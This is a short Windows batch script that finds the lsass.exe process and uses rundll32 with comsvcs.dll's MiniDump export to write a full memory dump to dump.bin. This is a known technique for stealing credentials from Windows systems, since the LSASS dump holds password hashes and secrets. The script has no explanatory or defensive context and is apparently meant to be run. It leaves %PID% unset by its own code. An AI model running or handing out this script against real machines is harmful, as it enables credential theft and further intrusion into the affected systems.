@echo off
tasklist /fo CSV /fi "IMAGENAME eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %PID% dump.bin full
